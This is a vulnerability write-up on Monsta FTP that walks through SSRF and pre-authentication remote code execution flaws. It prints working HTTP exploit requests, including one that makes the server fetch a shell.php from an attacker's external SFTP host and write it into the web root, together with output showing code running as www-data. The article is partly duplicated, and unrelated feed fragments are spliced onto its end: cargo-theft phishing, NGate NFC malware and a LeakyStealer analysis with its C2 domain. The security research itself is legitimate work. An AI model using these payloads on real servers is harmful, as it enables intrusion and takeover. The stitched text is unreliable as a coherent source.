In the references for CVE-2022-27468 was a link to a YouTube playlist (because, of course?) - but by the time we made it there, the videos had been marked as hidden:Following a suspicion that the SSRF reporter was the same as the user who reported the RCE vulnerability (and thus likely connected to the mysterious YouTube playlist), we went rummaging through their GitHub account - just in case a fleeting moment involving a compass and morals had hit them and prevented them from publishing a PoC.But alas, this was not the case.Given the above and the lack of code changes, we concluded the following: has a reported SSRF and RCE vulnerability has the same SSRF and RCE vulnerabilities, unfixedEverything is still awesomeIf Unsure, Apply Bubble WrapArmed with concern, we wanted to verify whether these vulnerabilities remained even in the latest version (at the time of research) - version .The codebase has undergone substantial changes over this period, and the developers have been clearly busy over the past three years. Alongside major new functionality, we noticed an intriguing addition: a file named .This file immediately stood out.It introduces a series of filtering functions applied across the application, including (but not limited to) explicit checks for path traversal and other input validation mechanisms:    /**
     * Check for directory traversal patterns
     */
    private static function containsDirectoryTraversal($path) {
        $patterns = [
            '../', '..\\\\', '..%2f', '..%2F', '..%5c', '..%5C',
            '%2e%2e%2f', '%2E%2E%2F', '%2e%2e%5c', '%2E%2E%5C',
            '....//....' // Double encoding attempts
        ];
        
        $lowerPath = strtolower($path);
        foreach ($patterns as $pattern) {
            if (strpos($lowerPath, $pattern) !== false) {
                return true;
            }
        }
        
        return false;
    }
There were also newly introduced functions to validate file paths:    /**
     * Validate and sanitize file paths to prevent directory traversal
     */
    public static function validateFilePath($path, $allowAbsolute = false) {
        if (!is_string($path)) {
            throw new InvalidArgumentException("Path must be a string");
        }
        
        if (strlen($path) > self::MAX_PATH_LENGTH) {
            throw new InvalidArgumentException("Path too long (max " . self::MAX_PATH_LENGTH . " characters)");
        }
        
        // Check for null bytes
        if (strpos($path, "\\0") !== false) {
            throw new InvalidArgumentException("Path contains null bytes");
        }
        
        // Check for directory traversal patterns
        if (self::containsDirectoryTraversal($path)) {
            throw new InvalidArgumentException("Path contains directory traversal sequences");
        }
        
        // Validate absolute paths if not allowed
        if (!$allowAbsolute && (substr($path, 0, 1) === '/' || preg_match('/^[a-zA-Z]:\\\\\\\\/', $path))) {
            throw new InvalidArgumentException("Absolute paths not allowed");
        }
        
        // Normalize the path
        return PathOperations::normalize($path);
    }
We won't list everything added, but rest assured - if it can be validated, a function has been added for it.These new filtering and validation helpers were subsequently applied throughout the codebase, wherever user input might be handled (and perhaps even in places it's definitely not). All the telltale signs of precise remediation.At first glance, we assumed these additions might represent (or at least relate to) fixes for the vulnerabilities we’ve been discussing - including the RCE identified as CVE-2022-27468.Before we went any deeper into the code, we decided to do a quick sanity check: by replaying our known-correct reproducer for the SSRF vulnerability (CVE-2025-31827) against the latest release ().Surprisingly? Shockingly? Disappointingly? Inevitably? It still worked.Which raises a question we couldn’t resist asking: did the developers actually know where to patch the vulnerabilities? (This is also the polite version of the question we originally asked).Or, did they just guess? Perhaps they never received the YouTube video playlist? Perhaps it was actually just Taylor Swift songs, subsequently hidden to confuse us all. And so, perhaps, following our shiny theory, they decided to wrap the entirety of the Monsta FTP in performative bubble wrap and called it a day.Honestly, at this stage and with what we’ve seen in general, we wouldn’t be shocked.Either way, the result is the same: the Monsta FTP code base now contains sprawling usage of validation functions that probably make you feel safe and secure - but don’t appear to actually have any material impact on the vulnerabilities they appear to be trying to resolve.Eventually, We Figured It OutAfter picking apart what felt like a web of overall confusion, we were able to make some progress in understanding the vulnerability itself.request={ <----[0]

It all starts with/mftp/application/api/api.php :At , we can see that the endpoint accepts a body parameter called  . Specifcially, the application expects a structured JSON blob as a value to  which Monsta FTP parses and uses to dispatch the right function.At , we specify a  - telling Monsta FTP whether we’re connecting to an FTP or SFTP server.At , we have a nested JSON blob called  - which contains the details of the external (S)FTP server we want to connect to, including  (specified at  and authenticationModeName (specified at  ) to allow a user to specify the type of authentication to use.At , the  parameter specifies the function we want to use within Monsta FTP once a successful connection is established.This code, with all available functions, is detailed in the switch statement below:function validateContextForAction($actionName, $context) {
        switch ($actionName) {
            case 'uploadFile':
            case 'uploadFileToNewDirectory':
            case 'uploadArchive':
                if (isset($context['remotePath'])) {
                    $validatedPath = InputValidator::validateFilePath($context['remotePath'], true);
                    // Additional upload-specific validation
                    if (isset($context['localPath'])) {
                        InputValidator::validateFileUpload($context['localPath'], $validatedPath);
                    }
                }
                break;

            case 'deleteFile':
                if (isset($context['remotePath'])) {
                    InputValidator::validateFilePath($context['remotePath'], true);
                }
                break;
                
            .. snip ..
        }
Eagle-eyed readers will be quick to notice that absolutely everything is wrapped in the usage of  .Undeterred, very quickly, one specific switch case value stood out to us: .Validation only really matters if we’re trying to do something nefarious - but is generally going to be wholly useless if we’re using the code as intended.Unsurprisingly, the  switch case maps to a function with the same name: */
public function downloadFile($transferOperation) {
    $this->ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION');

    if (!$this->handleDownloadFile($transferOperation))
        $this->handleMultiTransferError('DOWNLOAD_OPERATION', $transferOperation);
}
When using Monsta FTP to connect to an SFTP server, maps to application/api/file_sources/connection/SFTPConnection.php .This, our friends, is where things start to look up:protected function handleDownloadFile($transferOperation) {
    $remoteURL = $this->getRemoteFileURL($transferOperation->getRemotePath());  <---- [0]

     if(copy($remoteURL, $transferOperation->getLocalPath())) <---- [1]
         return true;

    // Check if remote file exists to provide better error information
    $statResult = stat($remoteURL);
    return false; // Copy failed
}
At  we can see that  is called.As we can see below, this function effectively joins two strings together - the external SFTP host, and a file path provided in the user-controlled parameter .
private function getRemoteFileURL($remotePath) {
    if ($remotePath == '/')
        $remotePath = '/./';
    return "ssh2.sftp://" . $this->sftpConnection . $remotePath;
}
At  within , we can see that the code is fairly simple: the  function is executed to transfer a file from the remote SFTP server to the location specified by the function .Surprisingly enough, the value returned by the function  is user-controlled - it’s the value of the  parameter.The code below, included for verbosity, shows how the  function proceeds to move files as instructed.public function copy($source, $destination) {
            $this->ensureConnectedAndAuthenticated('COPY_OPERATION');

						
						.. snip ..

            for ($i = 0; $i < sizeof($sources); ++$i) {
                $destinationPath = $destinations[$i];
                $destinationDir = PathOperations::remoteDirname($destinationPath);

                $sourcePathAndItem = $sources[$i];

                $sourcePath = $sourcePathAndItem[0];
                $sourceItem = $sourcePathAndItem[1];

                if ($destinationDir != "" && $destinationDir != "/" &&
                    array_search($destinationDir, $destinationDirs) === false) {
                    $destinationDirs[] = $destinationDir;
                    $this->makeDirectoryWithIntermediates($destinationDir);
                }

                if ($sourceItem === null)
                    $this->handleCopy($sourcePath, $destinationPath);
                else {
                    if ($sourceItem->isDirectory()) {
                        if (array_search($destinationPath, $destinationDirs) === false) {
                            $destinationDirs[] = $destinationPath;
                            $this->makeDirectoryWithIntermediates($destinationPath);
                        }
                    } else {
                        $this->handleCopy($sourcePath, $destinationPath);
                    }

                    $newPermissions[$destinationPath] = $sourceItem->getNumericPermissions();
                }
            }

            .. snip ..
 }
If you’re following along at home, you’d be forgiven for thinking this is a cute little theory that looks great on paper but falls apart in practice.Here’s the idea (shocking, we know):Trick Monsta FTP into connecting to our remote SFTP host.Have Monsta FTP download a file we control.Tell Monsta FTP to write that file to an arbitrary path on the Monsta server.Spoiler: it actually worked.We spun up a malicious SFTP server, sent a  request to the Monsta FTP instance, and watched it behave exactly like we feared - it connected, pulled our payload, and wrote it to the specified path.The following HTTP request illustrates how this would work:POST /mftp/application/api/api.php HTTP/1.1
Host: {{Nostname}}
Content-Type: application/x-www-form-urlencoded

request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-IP}}","remoteUsername":"sftpuser","initialDirectory":"/","authenticationModeName":"Password","password":"password111","port":2222},"actionName":"downloadFile","context":{"remotePath":"/shell.php","localPath":"/var/www/html/mftp/index3.php"}}&csrf_token=6e080f63ea774944feedef49eb77c6fffdd8291b9c6561022696b9222942644e

(Monsta FTP Remote Code Execution CVE-2025-34299)

Happy Friday, friends and.. others.

We’re glad/sorry to hear that your week has been good/bad, and it’s the weekend/but at least it’s almost the weekend!

### What’re We Doing Today, Mr Fox?

Today, in a tale that seems all too familar at this point, we begun as innocently as always - to reproduce an N-day in Monsta FTP as part of our emerging threat rapid reaction process we enact across the watchTowr client base.

Yet, somehow, we find ourselves saddled with the reality of discussing another zero-day.

“What on earth is Monsta FTP?” you might say.

Monsta FTP is a web-based FTP client that lets users manage and transfer files directly through a browser on remote servers, with a minimum of 5,000 instances sitting on the Internet.

We say minimum because the default context path of `/mftp/` has the likely unintended side effect of masking the exposure of this technology from generic Internet-wide scanners.

With an external (S)FTP server in hand, it's possible to connect to that server and browse its contents through Monsta FTP with the full suite of Web 3/4/5/6/7/8/9.0 functionality available - uploading, downloading AND modifying of files in an easy and user-friendly interface:

With a proud user base ranging from financial institutions, enterprises and over-engineering individual users, Monsta FTP is an interesting target for threat actors - made only better by the fact that it’s written in PHP.

For the love of all things good, we know - using PHP does not inherently make things insecure. We get it.

Go sit in the middle of the highway. That can also be safe, “it just depends”.

Just like PHP.

### What The N-Day

Our journey began, initially, with a specific version of Monsta FTP in the “crosshairs” so to speak. Specifically, Monsta FTP `2.10.4` .

Those of you who live/breathe version numbers of enterprise-used software, this version number likely has you frothing at the mouth. For those that aren’t, we will just tell you what the rabid already know - this is not the latest version of Monsta FTP, which at the time of our research was `2.11` published in July 2025.

Wipe the froth away, and let us explain - why are we looking at an older version?

Well, our research shows that a significant portion of the Internet is still not running the latest version (surprise!) and the powers-that-be had some random theory.

Random theories aside, Monsta FTP has a fascinating history of vulnerabilities. Following a gut feeling of general unease, we started our endeavours by determining if previous vulnerabilities had been patched correctly.

Looking through our favourite, shiniest CVE database - three (that’s 3) vulnerabilities stood out, supposedly affecting `2.10.3`.

That’s just 1 minor version before our target `2.10.4`! (Look at us, maths!)

- CVE-2022-31827 : Monsta FTP v2.10.3 was discovered to contain a Server-Side Request Forgery (SSRF) via the function performFetchRequest at HTTPFetcher.php.
- CVE-2022-27469 : Monsta FTP v2.10.3 was discovered to allow attackers to execute Server-Side Request Forgery (SSRF).
- CVE-2022-27468 : Monsta FTP v2.10.3 was discovered to contain an arbitrary file upload which allows attackers to execute arbitrary code via a crafted file uploaded to the web server.

Cue the usual actions, we quickly deployed two (2) environments;

- One running vulnerable version `2.10.3` and
- One running our target instance `2.10.4`.

Despite the 3 vulnerabilities reported in version `2.10.3`, there is little to no change in the code in `2.10.4`.

In fact, the only code we were able to identify any change within was purely cosmetic.

Scratching our heads and questioning reality around us, we wondered - could this mean that the vulnerabilities previously highlighted in `2.10.3` actually exist in later versions?

After an exasperated sigh at the general state of the world, and beginning to get the feeling that this was about to become appropriately described as a ‘saga’, we continued.

Within the aforementioned CVEs are a number of references - for example, CVE-2022-31827, the Server-Side Request Forgery vulnerability, references a PoC which when we blindly fired at both `2.10.3` and `2.10.4`, worked.. “as expected” and was trivially reproduced:

```
POST /application/api/api.php HTTP/1.1 Host: {{Hostname}} Content-Length: 275 Content-Type: application/x-www-form-urlencoded request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-Server}}","remoteUsername":"zero","initialDirectory":"/tmp/","authenticationModeName":"Password","password":"123456","port":22},"actionName":"fetchRemoteFile","context":{"source":"http://{{External-Server}}/flag.txt"}}
```

In the references for CVE-2022-27468 was a link to a YouTube playlist (because, of course?) - but by the time we made it there, the videos had been marked as hidden:

Following a suspicion that the SSRF reporter was the same as the user who reported the RCE vulnerability (and thus likely connected to the mysterious YouTube playlist), we went rummaging through their GitHub account - just in case a fleeting moment involving a compass and morals had hit them and prevented them from publishing a PoC.

But alas, this was not the case.

Given the above and the lack of code changes, we concluded the following:

- Everything is awesome
- `2.10.3` has a reported SSRF and RCE vulnerability
- `2.10.4` has the same SSRF and RCE vulnerabilities, unfixed
- Everything is still awesome

### If Unsure, Apply Bubble Wrap

Armed with concern, we wanted to verify whether these vulnerabilities remained even in the latest version (at the time of research) - version `2.11`.

The codebase has undergone substantial changes over this period, and the developers have been clearly busy over the past three years. Alongside major new functionality, we noticed an intriguing addition: a file named `inputValidator.php`.

This file immediately stood out.

It introduces a series of filtering functions applied across the application, including (but not limited to) explicit checks for path traversal and other input validation mechanisms:

```
/** * Check for directory traversal patterns */ private static function containsDirectoryTraversal($path) { $patterns = [ '../', '..\\\\', '..%2f', '..%2F', '..%5c', '..%5C', '%2e%2e%2f', '%2E%2E%2F', '%2e%2e%5c', '%2E%2E%5C', '....//....' // Double encoding attempts ]; $lowerPath = strtolower($path); foreach ($patterns as $pattern) { if (strpos($lowerPath, $pattern) !== false) { return true; } } return false; }
```

There were also newly introduced functions to validate file paths:

```
/** * Validate and sanitize file paths to prevent directory traversal */ public static function validateFilePath($path, $allowAbsolute = false) { if (!is_string($path)) { throw new InvalidArgumentException("Path must be a string"); } if (strlen($path) > self::MAX_PATH_LENGTH) { throw new InvalidArgumentException("Path too long (max " . self::MAX_PATH_LENGTH . " characters)"); } // Check for null bytes if (strpos($path, "\\0") !== false) { throw new InvalidArgumentException("Path contains null bytes"); } // Check for directory traversal patterns if (self::containsDirectoryTraversal($path)) { throw new InvalidArgumentException("Path contains directory traversal sequences"); } // Validate absolute paths if not allowed if (!$allowAbsolute && (substr($path, 0, 1) === '/' || preg_match('/^[a-zA-Z]:\\\\\\\\/', $path))) { throw new InvalidArgumentException("Absolute paths not allowed"); } // Normalize the path return PathOperations::normalize($path); }
```

We won't list everything added, but rest assured - if it can be validated, a function has been added for it.

These new filtering and validation helpers were subsequently applied throughout the codebase, wherever user input might be handled (and perhaps even in places it's definitely not). All the telltale signs of precise remediation.

At first glance, we assumed these additions might represent (or at least relate to) fixes for the vulnerabilities we’ve been discussing - including the RCE identified as CVE-2022-27468.

Before we went any deeper into the code, we decided to do a quick sanity check: by replaying our known-correct reproducer for the SSRF vulnerability (CVE-2025-31827) against the latest release ( `2.11`).

Surprisingly? Shockingly? Disappointingly? Inevitably? It still worked.

Which raises a question we couldn’t resist asking: did the developers actually know where to patch the vulnerabilities? (This is also the polite version of the question we originally asked).

Or, did they just guess? Perhaps they never received the YouTube video playlist? Perhaps it was actually just Taylor Swift songs, subsequently hidden to confuse us all. And so, perhaps, following our shiny theory, they decided to wrap the entirety of the Monsta FTP in performative bubble wrap and called it a day.

Honestly, at this stage and with what we’ve seen in general, we wouldn’t be shocked.

Either way, the result is the same: the Monsta FTP code base now contains sprawling usage of validation functions that probably make you feel safe and secure - but don’t appear to actually have any material impact on the vulnerabilities they appear to be trying to resolve.

### Eventually, We Figured It Out

After picking apart what felt like a web of overall confusion, we were able to make some progress in understanding the vulnerability itself.

```
request={ <----[0] "connectionType": "sftp", <----[1] "configuration": { <----[2] "host": "{{External-SFTP-Server}}", "remoteUsername": "zero", "initialDirectory": "/tmp/", <----[3] "authenticationModeName": "Password", <----[4] "password": "123456", "port": 22 }, "actionName": "fetchRemoteFile", <----[5] "context": { "source": "http://{{External-Server}}/flag.txt" } }
```

It all starts with `/mftp/application/api/api.php` :

- At `[0]`, we can see that the endpoint accepts a body parameter called `request`. Specifcially, the application expects a structured JSON blob as a value to `request` which Monsta FTP parses and uses to dispatch the right function.
- At `[1]`, we specify a `connectionType`\- telling Monsta FTP whether we’re connecting to an FTP or SFTP server.
- At `[2]`, we have a nested JSON blob called `configuration`\- which contains the details of the external (S)FTP server we want to connect to, including `initialDirectory`(specified at `[3]` and authenticationModeName (specified at `[4]`) to allow a user to specify the type of authentication to use.
- At `[5]`, the `action` parameter specifies the function we want to use within Monsta FTP once a successful connection is established.

This code, with all available functions, is detailed in the switch statement below:

```
function validateContextForAction($actionName, $context) { switch ($actionName) { case 'uploadFile': case 'uploadFileToNewDirectory': case 'uploadArchive': if (isset($context['remotePath'])) { $validatedPath = InputValidator::validateFilePath($context['remotePath'], true); // Additional upload-specific validation if (isset($context['localPath'])) { InputValidator::validateFileUpload($context['localPath'], $validatedPath); } } break; case 'downloadFile': case 'fetchFile': case 'getFileContents': case 'deleteFile': if (isset($context['remotePath'])) { InputValidator::validateFilePath($context['remotePath'], true); } break; .. snip .. }
```

Eagle-eyed readers will be quick to notice that absolutely everything is wrapped in the usage of `InputValidators` .

Undeterred, very quickly, one specific switch case value stood out to us: `downloadFile`.

Validation only really matters if we’re trying to do something nefarious - but is generally going to be wholly useless if we’re using the code as intended.

Unsurprisingly, the `downloadFile` switch case maps to a function with the same name:

```
*/ public function downloadFile($transferOperation) { $this->ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION'); if (!$this->handleDownloadFile($transferOperation)) $this->handleMultiTransferError('DOWNLOAD_OPERATION', $transferOperation); }
```

When using Monsta FTP to connect to an SFTP server, `handleDownloadFile` maps to `application/api/file_sources/connection/SFTPConnection.php` .

This, our friends, is where things start to look up:

```
protected function handleDownloadFile($transferOperation) { $remoteURL = $this->getRemoteFileURL($transferOperation->getRemotePath()); <---- [0] if(copy($remoteURL, $transferOperation->getLocalPath())) <---- [1] return true; // Check if remote file exists to provide better error information $statResult = stat($remoteURL); return false; // Copy failed }
```

At `[0]` we can see that `getRemoteFileURL` is called.

As we can see below, this function effectively joins two strings together - the external SFTP host, and a file path provided in the user-controlled parameter `remotePath`.

```
private function getRemoteFileURL($remotePath) { if ($remotePath == '/') $remotePath = '/./'; return "ssh2.sftp://" . $this->sftpConnection . $remotePath; }
```

At `[1]` within `handleDownloadFile`, we can see that the code is fairly simple: the `copy` function is executed to transfer a file from the remote SFTP server to the location specified by the function `getLocalPath`.

Surprisingly enough, the value returned by the function `getLocalPath` is user-controlled - it’s the value of the `localPath` parameter.

The code below, included for verbosity, shows how the `copy` function proceeds to move files as instructed.

```
public function copy($source, $destination) { $this->ensureConnectedAndAuthenticated('COPY_OPERATION'); .. snip .. for ($i = 0; $i < sizeof($sources); ++$i) { $destinationPath = $destinations[$i]; $destinationDir = PathOperations::remoteDirname($destinationPath); $sourcePathAndItem = $sources[$i]; $sourcePath = $sourcePathAndItem[0]; $sourceItem = $sourcePathAndItem[1]; if ($destinationDir != "" && $destinationDir != "/" && array_search($destinationDir, $destinationDirs) === false) { $destinationDirs[] = $destinationDir; $this->makeDirectoryWithIntermediates($destinationDir); } if ($sourceItem === null) $this->handleCopy($sourcePath, $destinationPath); else { if ($sourceItem->isDirectory()) { if (array_search($destinationPath, $destinationDirs) === false) { $destinationDirs[] = $destinationPath; $this->makeDirectoryWithIntermediates($destinationPath); } } else { $this->handleCopy($sourcePath, $destinationPath); } $newPermissions[$destinationPath] = $sourceItem->getNumericPermissions(); } } .. snip .. }
```

Brilliant, we guess.

### Simple Is As Simple Does

If you’re following along at home, you’d be forgiven for thinking this is a cute little theory that looks great on paper but falls apart in practice.

Here’s the idea (shocking, we know):

1. Trick Monsta FTP into connecting to our remote SFTP host.
2. Have Monsta FTP download a file we control.
3. Tell Monsta FTP to write that file to an arbitrary path on the Monsta server.

Cute.

Spoiler: it actually worked.

We spun up a malicious SFTP server, sent a `downloadFile` request to the Monsta FTP instance, and watched it behave exactly like we feared - it connected, pulled our payload, and wrote it to the specified path.

The following HTTP request illustrates how this would work:

```
POST /mftp/application/api/api.php HTTP/1.1 Host: {{Nostname}} Content-Type: application/x-www-form-urlencoded request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-IP}}","remoteUsername":"sftpuser","initialDirectory":"/","authenticationModeName":"Password","password":"password111","port":2222},"actionName":"downloadFile","context":{"remotePath":"/shell.php","localPath":"/var/www/html/mftp/index3.php"}}&csrf_token=6e080f63ea774944feedef49eb77c6fffdd8291b9c6561022696b9222942644e
```

Below, for completeness' sake, we verify that our new file has been successfully written to the specified file path:

```
GET /mftp/index3.php HTTP/1.1 Host: {{Hostname}}
```

```
HTTP/1.1 200 OK Date: Fri, 05 Sep 2025 09:43:50 GMT Server: Apache/2.4.54 (Debian) X-Powered-By: PHP/7.4.33 Vary: Accept-Encoding Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8 Content-Length: 75 watchTowr uid=33(www-data) gid=33(www-data) groups=33(www-data) watchTowr
```

So there we have it - a pre-authenticated Remote Code Execution vulnerability in the latest (at the time) release of Monsta FTP.

While we can’t definitively confirm whether the above vulnerability is identical to CVE-2022-27468, we can confidently state that this vulnerability has been patched as of version `2.11.3`, released on 26 August 2025.

As of November 4, 2025, a new CVE has been assigned with an updated description: CVE-2025-34299.

Sigh.

The most targeted commodities are food and beverage products.”Although the cyberattacks were mostly seen in North America, cargo theft is a problem across the world, impacting consumers and businesses that rely on the often-overlooked network of trucks, trains, ships, planes, and people.In these attacks, cybercriminals compromise the accounts of carrier companies that transport goods from one location to the next. By posing as legitimate carriers, they can place real bids on shipments and then redirect them to unauthorized destinations, where they or their partners will receive and steal the cargo.Researchers found that attackers take control of these accounts in at least one of three ways.Attackers may post a fake order on what’s called a “load board,” a digital marketplace that connects shippers with carriers so that cargo can be assigned and accepted. But when legitimate carriers inquire about the fake load board posting, the criminals reply with an email that includes a malicious link that, when clicked, installs Remote Monitoring and Management (RMM) software. (To make the scam more convincing, the cybercriminals also compromise a “broker” account so their load board posting looks legitimate.)Despite the sneaky install method, RMM software itself is entirely legitimate. It’s used by IT support teams to remotely fix issues for employees. But that legitimacy makes RMM software perfect for any cybercriminal campaign because it may raise fewer red flags from older antivirus tools.Once the attackers gain access to a carrier’s account, they can also deploy malware to steal account credentials, giving them greater access to a company’s network.2. Compromised email accountsA second observed attack method involved hijacking an active email address and then impersonating the owner when responding to emails about cargo orders and shipments. Here, too, cybercriminals inserted malicious links into emails that eventually install RMM tools.Finally, researchers also observed the attackers sending direct phishing emails to carriers, using classic social engineering tricks—like sending a bogus bill to lure victims into clicking malicious links. While many of the well-tested security best practices still apply—like not clicking on links inside emails—one of the strongest defenses is to use a security product that notifies users about RMM tools (also sometimes referred to as Remote Desktop Programs) installed on their device. RMM tools are legitimate, but because of their abuses in cybercriminal campaigns, it is important that every installation is verified and tracked.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>How a ransomware gang encrypted Nevada government&apos;s systems</title><link>https://www.bleepingcomputer.com/news/security/how-a-ransomware-gang-encrypted-nevada-governments-systems/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 6 Nov 2025 19:02:16 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The State of Nevada has completed its recovery from a ransomware attack it suffered on August 24, 2025, which impacted 60 state agencies, disrupting critical services related to health and public safety.

So, instead of stealing your bank card, the attackers capture NFC (Near Field Communication) activity on a mobile phone infected with the NGate malware and forward that transaction data to devices at ATMs. In NGate’s case the stolen data is sent over the network to the attackers’ servers rather than being relayed purely by radio.NFC comes in a few “flavors.” Some produce a static code—for example, the card that opens my apartment building door. That kind of signal can easily be copied to a device like my “Flipper Zero” so I can use that to open the door. But sophisticated contactless payment cards (like your Visa or Mastercard debit and credit cards) use dynamic codes. Each time you use the NFC, your card’s chip generates a unique, one-time code (often called a cryptogram or token) that cannot be reused and is different every time.So, that’s what makes the NGate malware more sophisticated. It doesn’t simply grab a signal from your card. The phone must be infected, and the victim must be tricked into performing a tap-to-pay or card-verification action and entering their PIN. When that happens, the app captures all the necessary NFC transaction data exchanged — not just the card number, but the fresh one-time codes and other details generated in that moment.The malware then instantly sends all that NFC data, including the PIN, to the attacker’s device. Because the codes are freshly generated and valid only for a short time, the attacker uses them immediately to imitate your card at an ATM; the accomplice at the ATM presents the captured data using a card-emulating device such as a phone, smartwatch, or custom hardware.But, as you can imagine, being ready at an ATM when the data comes in takes planning—and social engineering.First, attackers need to plant the malware on the victim’s device. Typically, they send phishing emails or SMS messages to potential victims. These often claim there is a security or technical issue with their bank account, trying to induce worry or urgency. Sometimes, they follow up with a phone call, pretending to be from the bank. These messages or calls direct victims to download a fake “banking” app from a non-official source, such as a direct link instead of Google Play.Once installed, the app app asks for permissions and leads victims through fake “card verification” steps. The goal is to get victims to act quickly and trustingly—while an accomplice waits at an ATM to cash out.NGate only works if your phone is infected and you’re tricked into initiating a tap-to-pay action on the fake banking app and entering your PIN. So the best way to stay safe from this malware is keep your phone protected and stay vigilant to social engineering:Stick to trusted sources. Download apps only from Google Play, Apple’s App Store, or the official provider. Your bank will never ask you to use another source. Use an up-to-date real-time anti-malware solution like Malwarebytes for Android, which already detects this malware.Do not engage with unsolicited callers. If someone claims to be from your bank, tell them you’ll call them back at the number you have on file.Malwarebytes for Android detects these banking Trojans as Android/Trojan.Spy.NGate.C; Android/Trojan.Agent.SIB01022b454eH140; Android/Trojan.Agent.SIB01c84b1237H62; Android/Trojan.Spy.Generic.AUR9552b53bH2756 and Android/Trojan.Banker.AURf26adb59C19.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Take control of your privacy with updates on Malwarebytes for Windows</title><link>https://www.malwarebytes.com/blog/privacy/2025/11/take-control-of-your-privacy-with-updates-on-malwarebytes-for-windows</link><author></author><category>threatintel</category><pubDate>Thu, 6 Nov 2025 16:40:02 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[It’s getting harder to keep your Windows space truly yours, as Microsoft increasingly serves annoying ads and tracks your data across third-party apps.Pushing back against your eroding privacy has been a scattered and sometimes complicated process… but we’re making it easier for you.

The duo performs reconnaissance on an infected machine and targets multiple crypto wallets, including browser extensions corresponding to crypto wallets. The malware also looks for browser history files from  and .The first stage (LeakyInjector) decrypts the -encrypted second stage  (LeakyStealer) and injects the payload into the explorer.exe process. The stealer computes the Bot ID corresponding to the infected machine and establishes persistence using an entry under the Run registry key. The malware implements a polymorphic engine that modifies memory bytes using specific hard-coded values. LeakyStealer searches for crypto wallets such as , and  in addition to browser extensions like , and . Two backdoor commands are implemented: downloading and executing a file, and executing Windows commands. A Hybrid Analysis PerspectiveThe sample is a 64-bit Windows executable (approximately 30 MB, padded with null bytes) and is signed with a valid digital certificate. The malware contains numerous debug strings and artifacts, indicating minimal obfuscation.The malware establishes persistence by creating an entry under the Run registry key:Figure 2 - Persistence through registry manipulationLooking at the “HTTP Traffic” in the Hybrid Analysis report, we can identify HTTP POST requests used for C2 communications. The domain was recently registered. The process connects to  on port 443 (TCP), using a browser-related user agent.Figure 3 - HTTP POST requests to the C2 serverThe stealer is looking for different browser extensions corresponding to crypto wallets:Figure 4 - Crypto wallets are targetedThe malware reads browser-related files to retrieve the browser history, as highlighted in the figure below.Figure 5 - Accessing browser-related dataThe first stage - which we named LeakyInjector - is looking for the “explorer.exe” process on the host:Figure 6 - The injector searches for the explorer.exe processThe malware injects the next stage into the explorer process using the low level APIs displayed below.Figure 7 - Perform process injection using low level APIsThe stealer that we called LeakyStealer is stored in an encrypted form in the injector and is decrypted using the  algorithm, with the key and nonce being hard-coded.Figure 8 - ChaCha20 algorithm is used to decrypt the stealer before it’s being injectedThe malware computes the Bot ID of the infected host by XOR-ing the “” volume serial number with the  constant. If not available, the Bot ID is initialized using the  function.Figure 9 - Bot ID value is computedIt retrieves the hostname, the username, and the domain assigned to the local machine (see Figure 10).Figure 10 - Extract information that will be exfiltratedThe malicious process determines whether it’s running with admin privileges using the  API (0x14 = ):Figure 11 - Determine if the malware is running with admin privilegesThe binary connects to the everstead[.]group C2 server using a hard-coded user agent, as highlighted below.Figure 12 - First connection to the C2 serverA field called “” is initialized with the “” value.

It establishes persistence by creating an entry called “” under the Run registry key:Figure 14 - Self-copy and persistenceLeakyStealer implements a “polymorphic engine” that is able to modify its memory area with hard-coded bytes at runtime:Figure 15 - Modify bytes using a routine called polymorphic engine at runtimeThe search is performed for the 8-byte marker “”. The process changes the memory protection of the first 16 bytes (including the marker) using  (0x40 = ). These 16 bytes are modified to a randomized sequence of “no-operation” assembly instructions, such as 0x90 for NOP, “” for , or “” for “”. The code that performs the patching is fairly common and frequently found in video game cheat engines. Its purpose in this sample remains unclear as it does not change any actual code and limits the patching to the marker bytes.Figure 16 - Replace the 16 bytes containing the hard-coded marker using different bytesThe binary enters a loop that builds a registration packet that will be sent to the C2 server (Figure 17).Figure 17 - LeakyStealer is beaconing to the C2 server at regular intervalsThe  and  methods are utilized to obtain the Windows version:Figure 18 - Retrieve the Windows OS versionThe registration packet contains the “” magic string, the Bot ID, 0x01 (value corresponding to a Registration packet), the admin flag, the traffic tag, the hostname, the username, the Windows domain, and the OS version:Figure 19 - Registration packet is constructedFigure 20 - Example of a registration packetLeakyStealer is looking for cryptocurrency wallets such as  and :Figure 21 - Multiple crypto wallets are targetedCryptocurrency browser extensions such as  and  are also targeted:Figure 22 - Crypto browser extensionsThe malware exfiltrates the registration packet to the “” URI. The server’s response is received and read using the  and  functions (Figure 23).Figure 23 - Server’s response is received and parsedThe binary extracts the history file from the following browsers: , and .Figure 24 - Obtain the history file from multiple browsersEvery history file found is copied to the temporary folder as “”, where “” is generated via a function call to . The malware reads these files in memory and deletes them afterward using the  API, as highlighted below.Figure 25 - Create copies of history files, read them, and then delete them afterwardsThe browser history is exfiltrated to the C2 server using the “” URI. We observe that the stealer adds the “” header in the request:Figure 26 - Browser history files are sent to the C2 serverFigure 27 - Example of exfiltrating the browsing history filesThe server’s response has the following structure: “”. The command type can be 0 (No command from the server), 1 (two commands implemented by the stealer), and >=2 (Unknown command type).Figure 28 - Specific packet structure is expected from the C2 serverThe first command is used to download and execute a file from the C2 server. It has the “d” structure.Figure 29 - Download command implemented by LeakyStealerAs we can see below, the process downloads the file from the C2 server, creates and populates the newly created file, and finally executes it using the  method.Figure 30 - Create new file mentioned in the commandFigure 31 - CreateProcessA API callThe second command can be used to run Windows commands on the infected machine and sends the output to the C2 server. The output is read using an anonymous pipe:Figure 32 - Execute Windows command on the infected hostMapping the infrastructureThe certificate’s issuer details point to a Hong Kong registrant. Similar versions of the stealer were signed with the same certificate. At the time of the analysis, the certificate was still valid, but at the time of publishing this report it has been revoked by its issuer.Figure 33 - Signed Certificate informationThe certificate thumbprint  revealed seven related samples, demonstrating that the threat actor reuses signing infrastructure across multiple payloads.This legitimate Extended Validation 